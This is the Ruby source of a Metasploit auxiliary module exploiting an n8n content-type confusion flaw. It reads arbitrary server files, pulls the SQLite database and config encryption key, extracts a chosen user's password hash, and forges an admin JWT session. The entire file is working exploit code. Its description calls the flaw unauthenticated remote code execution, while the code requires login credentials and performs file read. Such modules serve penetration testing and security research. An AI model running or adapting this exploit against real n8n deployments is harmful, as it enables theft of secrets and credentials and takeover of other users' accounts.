##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
require 'sqlite3'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'n8n arbitrary file read',
        'Description' => 'This module exploits CVE-2026-21858, a critical unauthenticated remote code execution vulnerability in n8n workflow automation platform versions 1.65.0 through 1.120.x. The vulnerability, dubbed "Ni8mare", is a content-type confusion flaw in webhook request handling that allows attackers to achieve arbitrary file read.',
        'Author' => [
          'dor attias', # research
          'msutovsky-r7' # module
        ],
        'Actions' => [
          ['READ_FILE', { 'Description' => 'Read an arbitrary file from the target' }],
          ['EXTRACT_SESSION', { 'Description' => 'Create an admin JWT session key by reading out secrets' }]
        ],
        'DefaultAction' => 'EXTRACT_SESSION',
        'License' => MSF_LICENSE,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )
    register_options([
      OptString.new('TARGET_EMAIL', [false, 'A target user for spoofed session, when EXTRACT_ADMIN_SESSION action is set'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),
      OptString.new('N8N_CONFIG_DIR', [false, 'Absolute path to n8n config directory', '/home/node/.n8n/'], conditions: ['ACTION', '==', 'EXTRACT_SESSION']),
      OptString.new('TARGET_FILENAME', [false, 'A target filename, when READ_FILE action is set'], conditions: ['ACTION', '==', 'READ_FILE']),
      OptString.new('USERNAME', [true, 'Username of n8n (email address)']),
      OptString.new('PASSWORD', [true, 'Password of n8n'])
    ])
  end

  def content_type_confusion_upload(form_uri, filename)
    extraction_filename = "#{Rex::Text.rand_text_alpha(rand(8..11))}.pdf"
    json_data = {
      files: {
        "field-0":
        {
          filepath: filename,
          originalFilename: extraction_filename,
          mimeType: 'text/plain',
          extenstion: ''
        }
      },
      data: [
        Rex::Text.rand_text_alpha(12)
      ],
      executionId: Rex::Text.rand_text_alpha(12)
    }
    res = send_request_cgi({
      'uri' => normalize_uri('form-test', form_uri),
      'method' => 'POST',
      'ctype' => 'application/json',
      'data' => json_data.to_json
    })

    fail_with(Failure::UnexpectedReply, 'Received unexpected response') unless res&.code == 200

    json_res = res.get_json_document

    fail_with(Failure::PayloadFailed, 'Failed to load target file') unless json_res['status'] != '200'
  end

  def login
    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'login'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => {
        'emailOrLdapLoginId' => datastore['USERNAME'],
        'email' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }.to_json
    )
    return false unless res
    return true if res&.code == 200

    json_data = res.get_json_document

    print_error("Login failed: #{json_data['message']}")

    false
  end

  def create_file_upload_workflow
    @workflow_name = "workflow_#{Rex::Text.rand_text_alphanumeric(8)}"
    random_uuid = SecureRandom.uuid.strip
    workflow_data = {
      'name' => @workflow_name,
      'active' => false,
      'settings' => {
        'saveDataErrorExecution' => 'all',
        'saveDataSuccessExecution' => 'all',
        'saveManualExecutions' => true,
        'executionOrder' => 'v1'
      },
      nodes: [
        {
          parameters: {
            formTitle: Rex::Text.rand_text_alphanumeric(8),
            formFields: {
              values: [
                {
                  fieldLabel: Rex::Text.rand_text_alphanumeric(8),
                  fieldType: 'file'
                }
              ]
            },
            options: {}
          },
          type: 'n8n-nodes-base.formTrigger',
          typeVersion: 2.3,
          position: [0, 0],
          id: 'e4f12efa-9975-4041-b71f-0ce4999ec5a7',
          name: 'On form submission',
          webhookId: random_uuid
        }
      ],
      'connections' => {},
      settings: { executionOrder: 'v1' }
    }

    print_status('Creating file upload workflow...')

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => workflow_data.to_json
    )
    fail_with(Failure::UnexpectedReply, "Failed to create workflow: #{res&.code}") unless res&.code == 200 || res.code == 201

    json = res.get_json_document

    @workflow_id = json.dig('data', 'id') || json['id']
    nodes = json.dig('data', 'nodes')
    version_id = json.dig('data', 'versionId')
    id = json.dig('data', 'id')

    fail_with(Failure::NotFound, 'Failed to get workflow ID from response') unless @workflow_id && nodes && version_id && id

    activation_data = {
      'workflowData' => {
        'name' => @workflow_name,
        'nodes' => nodes,
        'pinData' => {},
        'connections' => {},
        'active' => false,
        'settings' => {
          'saveDataErrorExecution' => 'all',
          'saveDataSuccessExecution' => 'all',
          'saveManualExecutions' => true,
          'executionOrder' => 'v1'
        },
        'tags' => [],
        'versionId' => version_id,
        'meta' => 'null',
        'id' => id
      },
      startNodes: [
        {
          name: 'On form submission',
          sourceData: 'null'
        }
      ],
      destinationNode: 'On form submission'
    }

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s, 'run'),
      'ctype' => 'application/json',
      'keep_cookies' => true,
      'data' => activation_data.to_json
    )

    fail_with(Failure::UnexpectedReply, 'Workflow may not run, received unexpected reply') unless res&.code == 200

    json_data = res.get_json_document

    fail_with(Failure::PayloadFailed, 'Failed to run workflow') unless json_data.dig('data', 'waitingForWebhook') == true
    random_uuid
  end

  def get_run_id
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('rest', 'executions'),
      'vars_get' =>
      {
        'filter' => %({"workflowId":"#{@workflow_id}"}),
        'limit' => 10
      }
    })
    fail_with(Failure::UnexpectedReply, 'Received unexpected reply, could not get run ID') unless res&.code == 200

    json_data = res.get_json_document

    run_id = json_data.dig('data', 'results', 0, 'id')
    fail_with(Failure::Unknown, 'Failed to get run ID, workflow might not run') unless run_id

    run_id
  end

  def archive_workflow
    print_status("Cleaning up workflow #{@workflow_id}...")

    res = send_request_cgi(
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s, 'archive'),
      'keep_cookies' => true
    )

    return false unless res&.code == 200

    json_data = res.get_json_document

    return false unless json_data.dig('data', 'id') == @workflow_id

    true
  end

  def valid_username?(username)
    /\A[\w+\-.]+@[a-z\d-]+(\.[a-z\d-]+)*\.[a-z]+\z/i =~ username
  end

  def delete_workflow
    res = send_request_cgi(
      'method' => 'DELETE',
      'uri' => normalize_uri(target_uri.path, 'rest', 'workflows', @workflow_id.to_s)
    )

    return false unless res&.code == 200

    json_data = res.get_json_document

    return false unless json_data['data'] == true

    true
  end

  def extract_content(run_id)
    res = send_request_cgi({
      'method' => 'GET',
      'uri' => normalize_uri('rest', 'executions', run_id)
    })

    fail_with(Failure::UnexpectedReply, 'Failed to get information about execution, received unexpected reply') unless res&.code == 200

    json_data = res.get_json_document

    file_data = json_data.dig('data', 'data')

    fail_with(Failure::PayloadFailed, 'Failed to read the file') unless file_data

    parsed_file_data = parse_json_data(file_data)

    file_content_enc = parsed_file_data[29]

    fail_with(Failure::NotFound, 'File not found') unless file_content_enc

    file_content = ::Base64.decode64(file_content_enc)

    file_content
  end

  def parse_json_data(data)
    begin
      parsed_file_data = JSON.parse(data)
    rescue JSON::ParserError
      fail_with(Failure::Unknown, 'Failed to parse JSON data')
    end
    parsed_file_data
  end

  def read_file(filename)
    form_uri = create_file_upload_workflow

    content_type_confusion_upload(form_uri, filename)

    run_id = get_run_id

    file_content = extract_content(run_id)

    if !archive_workflow
      print_warning('Could not archive workflow, workflow might need to be archived and deleted manually')
      return file_content
    end

    if !delete_workflow
      print_warning('Could not deleted workflow, workflow might need to be deleted manually')
      return file_content
    end

    file_content
  end

  def run
    fail_with(Failure::BadConfig, 'Username should be valid email') unless valid_username?(datastore['USERNAME'])
    fail_with(Failure::NoAccess, 'Failed to login') unless login

    case action.name
    when 'READ_FILE'
      target_filename = datastore['TARGET_FILENAME']
      fail_with(Failure::BadConfig, 'Filename needs to be set') if target_filename.blank?
      file_content = read_file(target_filename)

      stored_path = store_loot(target_filename, 'text/plain', datastore['rhosts'], file_content)
      print_good("Results saved to: #{stored_path}")

    when 'EXTRACT_SESSION'
      target_email = datastore['TARGET_EMAIL']

      fail_with(Failure::BadConfig, 'Target email needs to be set') if target_email.blank?
      fail_with(Failure::BadConfig, 'Target email should be valid email') unless valid_username?(target_email)

      db_content = read_file("#{datastore['N8N_CONFIG_DIR']}/database.sqlite")

      fail_with(Failure::NotFound, 'Could not found database file') unless db_content

      db_loot_name = store_loot('database.sqlite', 'application/x-sqlite3', datastore['rhosts'], db_content)

      print_good("Database saved to: #{db_loot_name}")

      db = SQLite3::Database.new(db_loot_name)

      user_id = db.execute(%(select id from user where email='#{target_email}')).dig(0, 0)
      password_hash = db.execute(%(select password from user where email='#{target_email}')).dig(0, 0)

      fail_with(Failure::NotFound, "Could not found #{target_email} in database") unless user_id && password_hash

      print_good("Extracted user ID: #{user_id}")
      print_good("Extracted password hash: #{password_hash}")

      store_valid_credential(
        user: target_email,
        private: password_hash
      )

      config_content = read_file("#{datastore['N8N_CONFIG_DIR']}/config")

      fail_with(Failure::NotFound, 'Could not found config file') unless config_content

      config_name = store_loot('n8n.config', 'plain/text', datastore['rhosts'], config_content)
      print_good("Config file saved to: #{config_name}")

      config_content_json = parse_json_data(config_content)
      encryption_key = config_content_json['encryptionKey']

      print_good("Extracted encryption key: #{encryption_key}")

      encryption_key = (0...encryption_key.length).step(2).map { |i| encryption_key[i] }
      encryption_key = encryption_key.join('')

      jwt_payload = %({"id":"#{user_id}","hash":"#{Base64.urlsafe_encode64(Digest::SHA256.digest("#{target_email}:#{password_hash}"))[0..9]}"})

      jwt_ticket = Msf::Exploit::Remote::HTTP::JWT.encode(jwt_payload.to_s, OpenSSL::Digest::SHA256.hexdigest(encryption_key))

      print_good("JWT ticket as #{target_email}: #{jwt_ticket}")

    end
  end

end
